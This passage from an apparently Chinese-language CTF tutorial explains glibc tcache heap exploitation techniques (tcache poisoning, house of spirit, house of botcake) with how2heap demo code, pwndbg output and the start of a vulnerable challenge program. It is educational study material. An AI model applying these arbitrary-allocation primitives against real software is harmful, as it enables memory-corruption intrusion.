class="type">long</span>)ptr;</span><br><span class="line"><span class="comment">//计算出 tcache_perthread_struct 的 chunk_mem_ptr, 首先要能泄露一个堆地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line">    temp = temp &amp; (~<span class="number">0xfff</span>);</span><br><span class="line">    temp += <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//向 tcache_perthread_struct 的 chunk 中写入一个地址，他就会出现在 tcache 中，将其申请出来就得到了一个可写的chunk</span></span><br><span class="line">    fake = (tcache_perthread_struct *)temp;</span><br><span class="line">    fake-&gt;entries[<span class="number">5</span>] = (tcache_entry *)global_buf;</span><br><span class="line"><span class="comment">//申请出那块可写的 chunk(内存)，进行写入</span></span><br><span class="line">    controlled_buf = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(controlled_buf, <span class="string">&quot;Tcache Corruption&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li><code>b 25</code>，查看 ptr </li>
<li><code>b 30</code>，查看temp，它是 tcache_perthread_struct 的 chunk_mem_ptr</li>
<li><code>b 33</code>，在这行代码处查看 global_buf 的内容，此时为 hello world</li>
<li><code>b 37</code>，再次查看 global_buf 的内容</li>
</ul>
<p>运行结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ctf@1a3f037ee8c1:~/pwn$ ./demo</span><br><span class="line">global_buf: hello world</span><br><span class="line">temp: 555555602670</span><br><span class="line">temp: 555555602010</span><br><span class="line">global_buf: Tcache Corruption</span><br></pre></td></tr></table></figure>

<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><p>来源：how2heap</p>
<p>此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="comment">//我们想要返回的地址是stack_var</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接下来申请两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk a 在: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk b 在: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉这两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 那个链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="comment">//我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p&quot;</span>, b, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;然后一次 malloc : %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二次 malloc: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>b 17</code>，此时申请了两个chunk，一个应该是为了防止合并到Top_chunk，另一个是要攻击的chunk，也就是b。</li>
<li><code>b 22</code>，此时两个chunk已经进入到tcache中。</li>
<li><code>b 27</code>，这里修改了b[0]的位置，也就是chunk b的next指针，此时bins中应为：<code>b -&gt; &amp;stack_var</code></li>
<li><code>b 30</code>，这里申请了一个chunk，此时bins中应为：<code>&amp;stack_var</code></li>
<li><code>b 33</code>，这里很明显就是申请出了&amp;stack_var作为chunk</li>
</ul>
<blockquote>
<p>原因：在glibc 2.27中没有像fastbin中那样检查free_chunk的size域</p>
</blockquote>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>对于tcache poisoning来说，我们的利用极其简单</p>
<p>只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了</p>
<p>程序首先在栈上声明了一个变量，之后malloc了chunk a(size&#x3D;128),此时free掉chunk a,a被链入到free list中</p>
<p>然后程序覆写了a的fd指针，将其指向了我们的栈指针</p>
<p>现在栈指针也被链入了我们的free list中</p>
<p>此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出</p>
<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><p>tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 在 %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 改成 0x40 \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;把 fake_chunks[2] 的地址赋给 a, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free 掉 a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再去 malloc(0x30)，在可以看到申请来的结果在: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要点：</p>
<ul>
<li>观察fake_chunks[]数组变化</li>
<li>free(a)，<code>a = &amp;fake_chunks[2];</code>原因：tcache中存放的是chunk_mem_ptr，fake_chunks[0]是prev_size域，fake_chunk[1]是size域</li>
<li>在free(a)后的bins：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x7fffffffe390 ◂— 0x0</span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure>

<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>本例就是通过free一个fake chunk来让我们malloc任意地址</p>
<p>程序首先让堆初始化了，然后申请了变量a和fake_chunks</p>
<p>之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针</p>
<p>现在free a，我们的fake_chunk就被放到了free list中</p>
<p>此时再malloc就可以返回我们的fake chunk了</p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的</p>
<p>我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc</p>
<p>让我们来看看和tcache有什么区别吧</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a, *b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">	<span class="comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// size</span></span><br><span class="line">	<span class="comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 这是fake_chunks[?]可以数一下</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">    fake_chunks[<span class="number">2</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line">    fake_chunks[<span class="number">10</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">	<span class="comment">//现在下一次的malloc就将会返回我们的fake chunk了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">0x4242424242424242L</span>L;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ok!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看完源代码可以发现,我们正常的hos是需要伪造两个chunk的,而tcache则不需要伪造下一个chunk,但是虽然本例中需要伪造两个chunk,但是我们所伪造的第二个chunk是可以不用为fastbin大小的chunk的</p>
<h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>对于没有tcache的glibc版本而言，我们需要连续伪造两块size合法的chunk，并且第二块chunk的size并不需要满足fastbin的要求，只要满足合法的size即可</p>
<p>本程序首先初始话了一下堆,然后申请了两个变量，一个是我们即将攻击的变量 a，另一个是我们的fake_chunks</p>
<p>程序先在fake_chunks[1]的地方也就是size域伪造了合法的size，0x40(满足fastbin size大小，与16字节对齐，标志位正确)</p>
<p>之后又在下一处伪造了第二个chunk，即从fake_chunks[8]开始的地方，这是为什么呢，因为我们第一个fake chunk的size伪造成了0x40，那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk</p>
<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h3><p>本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house_of_botcake 是针对 glibc2.29 对 tcache double free 做出限制以后提出的利用方法&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们希望 malloc 到的地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc 7 个 chunk 以便稍后填满 tcache&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): prev=%p. 待会用\n&quot;</span>, prev); </span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再 malloc(0x100): a=%p. 作为攻击的 chunk\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;最后 malloc(0x10) 防止与 top chunk 合并\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来构造 chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第一步: 填满 tcache 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第二步: free 掉 chunk a，放入 unsorted bin 中&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第三步: 释放掉 chunk prev 因为后面是一个 free chunk，所以他会与 chunk a 合并&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第四步: 这时候已经没有指向 chunk a 的指针了，从 tcache 中取出一个，然后再次 free(a) 就把 chunk a 加入到了 tcache 中，造成了 double free \n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个 0x120 会从 unsorted bin 中分割出来，也就控制了前面已经合并的那个 chunk a 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;把 chunk a 的 next 指针给改为前面声明的 stack_var 的地址&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个就能申请到 stack_var 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 在：%p\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ul>
<li>从31行开始，这里free了7个chunk是为了填满tcache</li>
<li>再free(a)，使a放入unsortedbin中，再free(prev)，使再unsortedbin中的chunk a和chunk prev合并，实现chunk_overlapping，以至于此时bins中并没有chunk a的信息（chunk a的prev_size在0x555555603ad0）如下：</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x5555556038c0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0                      </span><br></pre></td></tr></table></figure>

<ul>
<li>执行了38行的malloc(0x100)，使tcachebins中腾出了一个位置</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  6]: 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了39行过后，chunk a就被放入了tcachebins中，这就实现了<strong>double_free</strong>，一个在tcachebins中一个在unsortedbins</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins      <span class="comment">#|这个|#chunk a_mem_ptr</span></span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了42行后，修改了chunk a的next指针此时chunk a的情况：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/48gx 0x555555603ad0</span><br><span class="line">0x555555603ad0: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x555555603ae0: 0x00007fffffffe380      0x0000555555603010</span><br><span class="line">0x555555603af0: 0x0000000000000000      0x00000000000000f1</span><br><span class="line">0x555555603b00: 0x00007ffff7dcdca0      0x00007ffff7dcdca0</span><br><span class="line">0x555555603b10: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>同样bins也发生了变化，此时的bins:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x7fffffffe380 ◂— 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555603af0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555603af0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure>

<p>最终，我们在连续申请两个chunk就能得到<code>&amp;stack_var</code>的哪个chunk。</p>
<blockquote>
<p>实战中，我们的stacke_var可以是任意地址</p>
</blockquote>
<h4 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h4><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个<strong>double free</strong>（若还有修改功能到这里我们就可以做我们想做的事了）</p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上</p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="tcache-corruption-dup-—-libc-2-27"><a href="#tcache-corruption-dup-—-libc-2-27" class="headerlink" title="tcache_corruption+dup — libc 2.27"></a>tcache_corruption+dup — libc 2.27</h3><p><a href="https://faraz.faith/2019-10-20-secconctf-2019-one/">one</a></p>
<h3 id="tcache-corruption-—-libc-2-29"><a href="#tcache-corruption-—-libc-2-29" class="headerlink" title="tcache_corruption — libc 2.29"></a>tcache_corruption — libc 2.29</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 22</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* nodes[LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inital</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	alarm(<span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tcache Corruption - Two&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2. delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_n</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read(STDIN_FILENO, buf, size);</span><br><span class="line">	<span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_int</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read_n(buf, <span 